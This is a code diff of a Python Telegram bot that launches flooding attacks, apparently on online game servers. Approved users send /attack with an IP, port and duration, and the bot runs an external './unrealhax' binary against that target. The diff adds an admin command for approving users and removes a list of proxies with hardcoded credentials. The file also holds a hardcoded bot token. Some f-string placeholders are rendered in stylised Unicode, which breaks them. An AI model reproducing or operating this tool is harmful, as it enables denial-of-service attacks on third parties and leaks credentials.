@@ -1,30 +1,12 @@
 import asyncio
-import random
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from keep_alive import keep_alive
-import aiohttp
-
 keep_alive()
-
 TELEGRAM_BOT_TOKEN = '8043788530:AAHCqV0TcIA3Mx_0Kf5AewB5GQsCBMD6Iuw'
 ADMIN_USER_ID = 7903853982
 USERS_FILE = 'users.txt'
 attack_in_progress = False
-
-# List of proxies
-proxies = [
-    "198.23.239.134:6540:hhtggivt:1m1zhqrwi6xi",
-    "207.244.217.165:6712:hhtggivt:1m1zhqrwi6xi",
-    "107.172.163.27:6543:hhtggivt:1m1zhqrwi6xi",
-    "64.137.42.112:5157:hhtggivt:1m1zhqrwi6xi",
-    "173.211.0.148:6641:hhtggivt:1m1zhqrwi6xi",
-    "161.123.152.115:6360:hhtggivt:1m1zhqrwi6xi",
-    "167.160.180.203:6754:hhtggivt:1m1zhqrwi6xi",
-    "154.36.110.199:6853:hhtggivt:1m1zhqrwi6xi",
-    "173.0.9.70:5653:hhtggivt:1m1zhqrwi6xi",
-    "173.0.9.209:5792:hhtggivt:1m1zhqrwi6xi",
-]
 
 def load_users():
     try:
@@ -39,43 +21,62 @@ def save_users(users):
 
 users = load_users()
 
-# Function to get a random proxy
-def get_proxy():
-    return random.choice(proxies)
-
-async def proxy_rotator():
-    while True:
-        current_proxy = get_proxy()
-        print(f"Switching to proxy: {current_proxy}")
-        await asyncio.sleep(60)  # Change proxy every 1 minute
-
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
         "*🇮🇳 𓆩 𝐕𝐄𝐍𝐎𝐌&𝐄𝐗𝐓𝐄𝐍𝐁𝐎𝐓 𓆪 🇮🇳*\n\n"
-        "*𖤍 𝐔𝐬𝐞 /𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> 𖤍*\n"
+        "*🐰 𝐔𝐬𝐞 /𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> 🐰*\n"
         "*🔥 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐅𝐔𝐂𝐊 𝐁𝐆𝐌𝐈 🔥*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-# Example of using the current proxy with aiohttp
+async def manage(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    args = context.args
+
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*📵 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐚𝐝𝐦𝐢𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 2:
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /𝐦𝐚𝐧𝐚𝐠𝐞 <𝐚𝐝𝐝|𝐫𝐞𝐦> <𝐮𝐬𝐞𝐫_𝐢𝐝>*", parse_mode='Markdown')
+        return
+
+    command, target_user_id = args
+    target_user_id = target_user_id.strip()
+
+    if command == 'add':
+        users.add(target_user_id)
+        save_users(users)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐔𝐬𝐞𝐫 {𝐭𝐚𝐫𝐠𝐞𝐭_𝐮𝐬𝐞𝐫_𝐢𝐝} 𝐚𝐝𝐝𝐞𝐝 🥀.*", parse_mode='Markdown')
+    elif command == 'rem':
+        users.discard(target_user_id)
+        save_users(users)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐔𝐬𝐞𝐫 {𝐭𝐚𝐫𝐠𝐞𝐭_𝐮𝐬𝐞𝐫_𝐢𝐝} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 🥀.*", parse_mode='Markdown')
+
 async def run_attack(chat_id, ip, port, duration, context):
     global attack_in_progress
     attack_in_progress = True
-    current_proxy = get_proxy()
-    proxy_url = f"http://{current_proxy.split(':')[2]}:{current_proxy.split(':')[3]}@{current_proxy.split(':')[0]}:{current_proxy.split(':')[1]}"
 
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get('http://example.com', proxy=proxy_url) as response:
-                print(await response.text())
+        process = await asyncio.create_subprocess_shell(
+            f"./unrealhax {ip} {port} {duration} 25",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
 
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*📵 Proxy Error: {str(e)}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝐄𝐫𝐫𝐨𝐫 𝐝𝐮𝐫𝐢𝐧𝐠 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤: {str(e)}*", parse_mode='Markdown')
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝! ✅*\n*𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐮𝐬𝐢𝐧𝐠 𝐨𝐮𝐫 𝐒𝐀𝐕𝐈𝐓𝐄𝐑 𝐬𝐞𝐫𝐯𝐢𝐜𝐞!*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -85,23 +86,23 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*🔥 You need to be approved to use this bot.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🔥 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐛𝐞 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.🔥*", parse_mode='Markdown')
         return
 
     if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*📵 Another attack is already in progress.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*📵 𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.📵*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>*", parse_mode='Markdown')
         return
 
     ip, port, duration = args
     await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ Attack Launched!*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*🕒 Duration: {duration} seconds*\n"
-        f"*🈲 Enjoy and dominate!*"
+        f"*✅ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐚𝐮𝐧𝐜𝐡𝐞𝐝!*\n"
+        f"*🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {𝐢𝐩}:{𝐩𝐨𝐫𝐭}*\n"
+        f"*🕒 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬*\n"
+        f"*🈲 𝐄𝐧𝐣𝐨𝐲 𝐀𝐧𝐝 𝐅𝐮𝐜𝐤 𝐖𝐡𝐨𝐥𝐞 𝐋𝐨𝐛𝐛𝐲*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
@@ -109,12 +110,10 @@ async def attack(update: Update, context: CallbackContext):
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("manage", manage))
     application.add_handler(CommandHandler("attack", attack))
-    
-    # Start proxy rotation task
-    asyncio.create_task(proxy_rotator())
-
     application.run_polling()
 
 if __name__ == '__main__':
     main()
+    
